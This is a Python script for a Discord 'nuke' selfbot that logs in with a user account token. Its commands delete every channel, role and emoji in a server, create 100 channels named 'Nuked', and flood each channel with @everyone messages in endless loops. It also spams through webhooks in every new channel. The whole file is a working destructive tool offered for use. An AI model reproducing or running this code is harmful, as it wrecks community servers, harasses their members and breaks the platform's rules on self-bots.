#nuke/selfbot simpless

import discord
from discord.ext import commands
from discord import AsyncWebhookAdapter
import aiohttp

intents = discord.Intents(messages=True, guilds=True, members=True)

tucan = input("token (user) > ")

o = commands.Bot(command_prefix="!", case_insensitive=True, self_bot=True, intents=intents)


@o.event
async def on_ready():
  print(f"""

   Connected : {o.user.name}
   ID : {o.user.id}

   Commands:

   !nuke - cocks the server
   !cdel - deletes all the channels
   !emojinuke -  deletes emojis
   !rolenuke - deletes roles
   !flood - flood all chats
  """)

@o.command()
async def emojinuke(ctx):
    try:
      for emoji in ctx.guild.emojis:
         await emoji.delete()
         print(f"[-] Emoji {emoji.name} deleted.")
    except:
        print("[-] Couldn't delete the emoji.")
        pass

@o.command()
async def nuke(ctx):
    try:
        for channel in ctx.guild.channels:
            await channel.delete()
            print(f"[-] Channel {channel.name} deleted.")
    except:
        print("[-] Couldn't delete the channel.")
        pass
    await ccflood(ctx)


async def ccflood(ctx):
    for i in range(100):
        await ctx.guild.create_text_channel(name="Nuked")  

@o.event
async def on_guild_channel_create(channel):
    try:
      webhook = await channel.create_webhook(name="nuked")
      while True:
        webhook.send("everyone")
    except:
        pass


@o.command()
async def flood(ctx):
    try:
        while True:
            for channel in ctx.guild.channels:
                await channel.send("@everyone higuys")
                print("[-] Flood sent.")
    except:
        print("[-] Couldn't flood.")
    pass


@o.command()
async def cdel(ctx):
    try:
        for channel in ctx.guild.channels:
            await channel.delete()
            print(f"[-] {channel.name} deleted.")
    except:
        pass

@o.command()
async def rolenuke(ctx):
    try:
      for role in ctx.guild.roles:
          await role.delete()
          print(f"[-] role {role.name} deleted.")
    except:
        print("[-] Couldn't delete role.")
        pass

o.run(tucan, bot=False)
